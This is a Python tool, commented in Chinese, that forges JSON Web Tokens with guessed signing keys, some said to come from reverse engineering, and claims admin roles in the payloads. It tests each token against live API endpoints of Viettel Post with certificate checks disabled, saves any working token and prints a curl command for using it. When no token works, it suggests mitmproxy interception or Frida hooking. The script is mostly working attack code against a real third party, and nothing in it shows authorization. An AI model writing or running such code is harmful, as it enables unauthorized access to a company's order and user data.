#!/usr/bin/env python3
"""
JWT伪造和自动测试工具
使用所有可能的签名密钥伪造JWT，并立即测试有效性
"""

import jwt
import time
import json
import requests
from datetime import datetime, timedelta

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

# 可能的签名密钥（从逆向分析中提取）
POSSIBLE_SECRETS = [
    # 1. AES密钥（最有可能）
    "Lx90aXyZn4GtRVbT8JpCEm7qUwNdh3YK",
    
    # 2. 硬编码密码
    "YAaG8ji8TP3I3K6",
    "abc123",
    
    # 3. 常见密钥模式
    "vtp-wms-secret",
    "viettelpost-wms",
    "wms-client-secret",
    "keycloak-secret",
    "vtp-secret-key",
    
    # 4. 租户代码作为密钥
    "VTP",
    "YODY",
    "VTP_MM",
    
    # 5. 空密钥（有些系统不验证签名）
    "",
    "secret",
    "changeit",
    
    # 6. Base64编码的密钥
    "THg5MGFYeVpuNEdpUlZiVDhKcENFbTdxVXdOZGgzWUs=",
    
    # 7. 其他可能的组合
    "viettelpost",
    "wms-gateway",
    "jwt-secret-key",
]

# JWT Payload变体
PAYLOADS = [
    # Payload 1: 完整管理员权限
    {
        "sub": "admin",
        "username": "admin",
        "preferred_username": "admin",
        "name": "Administrator",
        "tenantCode": "VTP",
        "tenant_id": "1",
        "role": "ADMIN",
        "realm_access": {
            "roles": ["ADMIN", "WAREHOUSE_ADMIN", "SYSTEM_ADMIN"]
        },
        "resource_access": {
            "wms-client": {
                "roles": ["admin", "user"]
            }
        },
        "permissions": [
            "order:read",
            "order:write",
            "order:delete",
            "user:admin",
            "warehouse:admin"
        ],
        "scope": "openid profile email",
        "email_verified": True,
        "email": "admin@viettelpost.vn",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400,  # 24小时
        "iss": "https://dws-sso.viettelpost.vn/realms/wms",
        "aud": "wms-client",
        "typ": "Bearer",
        "azp": "wms-client",
        "session_state": "test-session-state"
    },
    
    # Payload 2: 简化版本
    {
        "sub": "warehouse_user",
        "username": "warehouse_user",
        "tenantCode": "VTP",
        "role": "WAREHOUSE_ADMIN",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    },
    
    # Payload 3: 最小权限
    {
        "sub": "user",
        "tenantCode": "VTP",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    }
]

# 测试API端点
TEST_ENDPOINTS = [
    {
        "name": "订单搜索",
        "url": "https://gw.viettelpost.vn/api/v1/outbound-request/search",
        "method": "GET",
        "params": {"page": 1, "page_size": 1}
    },
    {
        "name": "订单详情",
        "url": "https://gw.viettelpost.vn/api/v1/outbound-request/1",
        "method": "GET"
    },
    {
        "name": "入库订单",
        "url": "https://gw.viettelpost.vn/api/v1/inbound-request/search-v2",
        "method": "GET",
        "params": {"page": 1, "page_size": 1}
    },
    {
        "name": "用户信息",
        "url": "https://gw.viettelpost.vn/api/v1/user/me",
        "method": "GET"
    }
]

def forge_jwt(payload, secret, algorithm="HS256"):
    """伪造JWT token"""
    try:
        token = jwt.encode(payload, secret, algorithm=algorithm)
        return token
    except Exception as e:
        return None

def test_token(token, endpoint_info):
    """测试token有效性"""
    try:
        headers = {
            "Authorization": f"Bearer {token}",
            "X-Tenant-Code": "VTP",
            "Content-Type": "application/json"
        }
        
        if endpoint_info["method"] == "GET":
            response = requests.get(
                endpoint_info["url"],
                headers=headers,
                params=endpoint_info.get("params", {}),
                verify=False,
                timeout=10
            )
        else:
            response = requests.post(
                endpoint_info["url"],
                headers=headers,
                json=endpoint_info.get("params", {}),
                verify=False,
                timeout=10
            )
        
        return {
            "status_code": response.status_code,
            "success": response.status_code in [200, 201],
            "response": response.text[:200] if response.text else "",
            "endpoint": endpoint_info["name"]
        }
    except Exception as e:
        return {
            "status_code": 0,
            "success": False,
            "error": str(e),
            "endpoint": endpoint_info["name"]
        }

def main():
    print("="*80)
    print("🔑 JWT伪造和自动测试工具")
    print("="*80)
    print(f"签名密钥数量: {len(POSSIBLE_SECRETS)}")
    print(f"Payload变体:  {len(PAYLOADS)}")
    print(f"测试端点:     {len(TEST_ENDPOINTS)}")
    print(f"总组合数:     {len(POSSIBLE_SECRETS) * len(PAYLOADS)}")
    print("="*80)
    print()
    
    successful_tokens = []
    total_tests = 0
    
    # 遍历所有密钥和payload组合
    for secret_idx, secret in enumerate(POSSIBLE_SECRETS, 1):
        secret_display = secret[:30] + "..." if len(secret) > 30 else secret
        if secret == "":
            secret_display = "(空密钥)"
        
        print(f"\n{'━'*80}")
        print(f"[{secret_idx}/{len(POSSIBLE_SECRETS)}] 测试密钥: {secret_display}")
        print(f"{'━'*80}")
        
        for payload_idx, payload in enumerate(PAYLOADS, 1):
            payload_type = f"Payload{payload_idx}"
            print(f"\n  [{payload_type}] 用户: {payload.get('username', payload.get('sub'))}, 角色: {payload.get('role', 'N/A')}")
            
            # 尝试HS256算法
            token = forge_jwt(payload, secret, "HS256")
            
            if not token:
                print(f"    ❌ JWT生成失败")
                continue
            
            # 显示JWT（前50字符）
            token_display = token[:50] + "..." if len(token) > 50 else token
            print(f"    🔑 Token: {token_display}")
            
            # 测试所有端点
            any_success = False
            for endpoint in TEST_ENDPOINTS:
                total_tests += 1
                result = test_token(token, endpoint)
                
                if result["success"]:
                    print(f"    ✅ {endpoint['name']}: 成功！ (状态码: {result['status_code']})")
                    any_success = True
                    
                    # 保存成功的token
                    successful_tokens.append({
                        "token": token,
                        "secret": secret,
                        "payload": payload,
                        "endpoint": endpoint["name"],
                        "response": result["response"]
                    })
                    
                elif result["status_code"] == 401:
                    print(f"    ❌ {endpoint['name']}: 认证失败 (401)")
                elif result["status_code"] == 403:
                    print(f"    ⚠️  {endpoint['name']}: 权限不足 (403) - Token可能有效但权限不够")
                elif result["status_code"] == 404:
                    print(f"    ℹ️  {endpoint['name']}: 资源不存在 (404)")
                elif result["status_code"] == 0:
                    print(f"    🔌 {endpoint['name']}: 连接失败 ({result.get('error', 'Unknown')})")
                else:
                    print(f"    ❓ {endpoint['name']}: 状态码 {result['status_code']}")
            
            # 如果找到有效token，保存完整信息
            if any_success:
                print(f"\n    🎉 发现有效Token！")
                print(f"    {'─'*60}")
                print(f"    密钥: {secret}")
                print(f"    完整Token:")
                print(f"    {token}")
                print(f"    {'─'*60}")
                
                # 保存到文件
                with open("/workspace/valid_token_found.txt", "w") as f:
                    f.write(f"密钥: {secret}\n")
                    f.write(f"Token: {token}\n\n")
                    f.write(f"Payload:\n{json.dumps(payload, indent=2)}\n")
                
                with open("/workspace/valid_token.txt", "w") as f:
                    f.write(token)
    
    # 最终总结
    print("\n" + "="*80)
    print("📊 测试完成汇总")
    print("="*80)
    print(f"总测试次数:     {total_tests}")
    print(f"成功Token数:    {len(successful_tokens)}")
    print(f"成功率:         {len(successful_tokens)/total_tests*100:.2f}%" if total_tests > 0 else "N/A")
    print("="*80)
    
    if successful_tokens:
        print("\n✅ 成功！发现以下有效Token:")
        print("─"*80)
        for idx, token_info in enumerate(successful_tokens, 1):
            print(f"\n{idx}. 密钥: {token_info['secret'][:50]}{'...' if len(token_info['secret']) > 50 else ''}")
            print(f"   端点: {token_info['endpoint']}")
            print(f"   Token: {token_info['token'][:60]}...")
        
        print("\n" + "─"*80)
        print("📁 Token已保存到:")
        print("   /workspace/valid_token.txt (可直接使用)")
        print("   /workspace/valid_token_found.txt (包含完整信息)")
        print("\n🚀 立即使用:")
        print('   export TOKEN=$(cat /workspace/valid_token.txt)')
        print('   curl -sk "https://gw.viettelpost.vn/api/v1/outbound-request/search?page=1&page_size=10" \\')
        print('     -H "Authorization: Bearer $TOKEN" | jq .')
        
    else:
        print("\n❌ 未发现有效Token")
        print("\n📋 可能的原因:")
        print("   1. 签名密钥不正确")
        print("   2. JWT算法不匹配（使用了RS256而非HS256）")
        print("   3. Payload格式不正确")
        print("   4. API需要额外的认证机制")
        print("\n💡 建议:")
        print("   1. 使用mitmproxy抓取真实token")
        print("   2. 使用Frida hook JWT生成函数")
        print("   3. 尝试从Keycloak公钥验证机制入手")

if __name__ == "__main__":
    main()
